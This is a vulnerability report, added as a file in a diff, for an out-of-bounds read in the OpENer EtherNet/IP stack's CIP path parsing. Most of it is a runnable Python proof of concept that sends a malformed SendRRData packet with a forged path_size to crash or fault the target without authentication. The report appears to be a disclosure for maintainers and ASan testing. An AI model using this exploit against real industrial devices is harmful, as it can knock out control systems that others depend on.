@@ -1,0 +1,118 @@
+issue #582
+
+Description
+OpENer 2.3.0 (commit 76b95cf) has an out-of-bounds read issue in CIP message parsing when handling malformed explicit requests with a forged EPath size. An attacker can send a valid ENIP SendRRData frame carrying a very short CIP payload whose path_size field claims that many more path words are present than are actually available. Because the parser trusts the attacker-controlled path_size and continues decoding path segments without a remaining-length boundary, it reads beyond the end of the stack receive buffer. This issue is remotely triggerable via network traffic and does not require authentication.
+
+PoC
+
+#!/usr/bin/env python3
+import argparse
+import socket
+import struct
+import sys
+import time
+
+ENCAP_HEADER_LEN = 24
+CMD_REGISTER_SESSION = 0x0065
+CMD_SEND_RR_DATA = 0x006F
+ITEM_ID_NULL_ADDRESS = 0x0000
+ITEM_ID_UNCONNECTED_DATA = 0x00B2
+DEFAULT_TARGET_BUFFER_SIZE = 512
+DEFAULT_PATH_WORDS = 240
+
+
+def build_header(command, length, session, context):
+    return struct.pack("<HHI", command, length, session) + b"\x00" * 4 + context[:8].ljust(8, b"\x00") + b"\x00" * 4
+
+
+def recv_enip(sock):
+    header = sock.recv(ENCAP_HEADER_LEN)
+    if len(header) < ENCAP_HEADER_LEN:
+        return None
+    body = b""
+    length = struct.unpack("<H", header[2:4])[0]
+    while len(body) < length:
+        chunk = sock.recv(length - len(body))
+        if not chunk:
+            return None
+        body += chunk
+    return header + body
+
+
+def register_session(sock, context):
+    payload = struct.pack("<HH", 1, 0)
+    sock.sendall(build_header(CMD_REGISTER_SESSION, len(payload), 0, context) + payload)
+    response = recv_enip(sock)
+    if response is None or len(response) < ENCAP_HEADER_LEN:
+        raise RuntimeError("short or empty RegisterSession response")
+    command, _, session, status = struct.unpack("<HHII", response[:12])
+    if command != CMD_REGISTER_SESSION:
+        raise RuntimeError(f"unexpected response command=0x{command:04x}")
+    if status != 0 or session == 0:
+        raise RuntimeError(f"register failed: status=0x{status:08x}, session={session}")
+    return session
+
+
+def build_tail(buffer_size):
+    if buffer_size < 64:
+        raise ValueError("buffer_size too small")
+    available = buffer_size - 42  # bytes left after ENIP/CPF framing and service+path_size
+    if available <= 0:
+        raise ValueError("buffer_size is smaller than protocol framing")
+    return bytes([0x20, 0x01]) * (available // 2)
+
+
+def build_trigger_packet(session, context, path_words, buffer_size):
+    if not 1 <= path_words <= 0xFF:
+        raise ValueError("path_words must be 1..255")
+    cip_payload = bytes([0x0E, path_words])
+    cpf = (
+        struct.pack("<H", 3)
+        + struct.pack("<H", ITEM_ID_NULL_ADDRESS)
+        + struct.pack("<H", 0)
+        + struct.pack("<H", ITEM_ID_UNCONNECTED_DATA)
+        + struct.pack("<H", len(cip_payload))
+        + cip_payload
+        + build_tail(buffer_size)
+    )
+    command_specific = b"\x00" * 6 + cpf
+    return build_header(CMD_SEND_RR_DATA, len(command_specific), session, context) + command_specific
+
+
+def one_attempt(host, port, timeout, path_words, buffer_size, context):
+    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
+        sock.settimeout(timeout)
+        sock.connect((host, port))
+        session = register_session(sock, context)
+        sock.sendall(build_trigger_packet(session, context, path_words, buffer_size))
+        return recv_enip(sock)
+
+
+def main():
+    parser = argparse.ArgumentParser(description="Compact ASan PoC for DecodePaddedEPath.")
+    parser.add_argument("--host", default="127.0.0.1")
+    parser.add_argument("--port", type=int, default=44818)
+    parser.add_argument("--attempts", type=int, default=1)
+    parser.add_argument("--timeout", type=float, default=1.5)
+    parser.add_argument("--interval-ms", type=int, default=0)
+    parser.add_argument("--path-words", type=int, default=DEFAULT_PATH_WORDS)
+    parser.add_argument("--buffer-size", type=int, default=DEFAULT_TARGET_BUFFER_SIZE)
+    args = parser.parse_args()
+    print(f"[*] Target={args.host}:{args.port} attempts={args.attempts} path_words={args.path_words} buffer_size={args.buffer_size}")
+    for i in range(args.attempts):
+        context = f"ASAN{i:04d}".encode("ascii")[:8]
+        try:
+            response = one_attempt(args.host, args.port, args.timeout, args.path_words, args.buffer_size, context)
+            if response is None:
+                print(f"[{i + 1:03d}] FAIL - no response (reset, crash, or ASan abort)")
+            else:
+                print(f"[{i + 1:03d}] RESP - response_len={len(response)}")
+        except Exception as exc:  # noqa: BLE001
+            print(f"[{i + 1:03d}] FAIL - {type(exc).__name__}: {exc}")
+        if args.interval_ms > 0 and i + 1 < args.attempts:
+            time.sleep(args.interval_ms / 1000.0)
+    return 0
+
+
+if __name__ == "__main__":
+    sys.exit(main())
